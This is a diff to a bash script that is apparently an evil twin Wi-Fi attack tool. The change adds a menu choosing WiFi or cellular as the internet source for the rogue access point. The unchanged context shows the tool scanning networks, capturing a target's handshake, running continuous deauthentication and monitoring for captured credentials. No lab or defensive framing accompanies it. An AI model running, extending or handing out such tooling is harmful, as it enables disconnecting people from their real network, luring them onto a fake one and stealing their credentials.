@@ -53,7 +53,7 @@ cleanup() {
     # Clean up routing rules silently - CELLULAR ONLY (FIXED)
     ip rule del from all lookup main pref 1 2>/dev/null || true
     ip rule del from all iif lo oif wlan1 uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
-    # ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true  # REMOVED: WiFi sharing rule
+    ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true 
     ip rule del from all iif lo oif rmnet_data2 lookup main pref 17000 2>/dev/null || true
     ip rule del from all iif lo oif wlan1 lookup 97 pref 17000 2>/dev/null || true
     ip rule del pref 21000 2>/dev/null || true  # FIXED: delete by priority only
@@ -404,12 +404,42 @@ update_configs() {
     fi
 }
 
+# ==================== INTERNET SELECTION ====================
+select_internet_source() {
+    echo "----------------------------------------"
+    echo "Internet Source:"
+    echo " 1. WiFi Sharing (fakeap.sh)"
+    echo " 2. Cellular Data (4g-ap.sh)"
+    echo "----------------------------------------"
+    
+    while true; do
+        read -p "Select (1/2): " choice
+        case $choice in
+            1)
+                INTERNET_CHOICE="wifi"
+                break
+                ;;
+            2)
+                INTERNET_CHOICE="cellular"
+                break
+                ;;
+            *)
+                log_error "Invalid choice"
+                ;;
+        esac
+    done
+}
+
 # ==================== START EVIL TWIN ====================
 start_evil_twin() {
     log_info "Starting evil twin..."
     
-    # Always use cellular (4G) for internet sharing (MODIFIED)
-    ./4g-ap.sh > /dev/null 2>&1 &
+    # Start AP silently
+    if [ "$INTERNET_CHOICE" = "wifi" ]; then
+        ./fakeap.sh > /dev/null 2>&1 &
+    else
+        ./4g-ap.sh > /dev/null 2>&1 &
+    fi
     sleep 8
     
     # Start backend with GUARANTEED silence
@@ -438,9 +468,9 @@ monitor_attack() {
     echo "Target:    $TARGET_SSID"
     echo "Evil Twin: $FAKE_SSID" 
     echo "Channel:   $TARGET_CHANNEL"
-    echo "Internet:  4G Cellular"  # MODIFIED
+    echo "Internet:   $INTERNET_CHOICE"
     echo "Handshake: $HANDSHAKE_FILE"
-    echo "Deauth:    CONTINUOUS"  # MODIFIED
+    echo "Deauth:    CONTINUOUS" 
     echo "----------------------------------------"
     echo "Monitoring for credentials..."
     echo "----------------------------------------"
@@ -550,7 +580,7 @@ main() {
     scan_networks
     capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_SSID"
     update_configs "$TARGET_BSSID" "$TARGET_CHANNEL" "$FAKE_SSID"
-    # REMOVED: select_internet_source() - Always cellular now
+    select_internet_source
     start_evil_twin
     monitor_attack "$TARGET_BSSID"
 }
